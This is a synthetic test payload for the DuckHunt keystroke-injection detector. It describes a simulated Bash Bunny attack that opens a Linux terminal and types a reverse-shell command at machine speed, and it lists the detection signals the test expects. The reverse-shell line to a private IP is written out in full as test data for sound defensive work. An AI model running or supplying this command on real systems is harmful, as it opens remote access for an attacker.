# DuckHunt Test Payload: Bash Bunny Linux Attack
# This is a SYNTHETIC test payload for DuckHunt detection validation
# Simulates a Bash Bunny attack on Linux system

# Test 3: Linux reverse shell establishment
# Attack vector: Opens terminal and establishes reverse shell

# Simulated keystroke sequence (timing in ms):
# CTRL+ALT+T (open terminal) - 0ms
# DELAY 200ms
# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 - typed at 15ms intervals
# ENTER

# Expected Detection:
# - Speed anomaly (15ms intervals vs ~145ms human average)
# - Pattern match: "bash -i", "/dev/tcp", suspicious IP address pattern
# - Terminal context with suspicious command
# - Zero error rate
# - Consistent mechanical timing (no human variation)

# Detection Confidence: Expected >0.90

# Keystroke sequence breakdown:
# b (15ms) a (15ms) s (15ms) h (15ms) SPACE (15ms) - (15ms) i (15ms) SPACE (15ms)
# > (15ms) & (15ms) SPACE (15ms) / (15ms) d (15ms) e (15ms) v (15ms) / (15ms)
# t (15ms) c (15ms) p (15ms) / (15ms) 1 (15ms) 0 (15ms) . (15ms) 0 (15ms) . (15ms)
# 0 (15ms) . (15ms) 1 (15ms) / (15ms) 4 (15ms) 4 (15ms) 4 (15ms) 4 (15ms)
# SPACE (15ms) 0 (15ms) > (15ms) & (15ms) 1 (15ms)
# ENTER
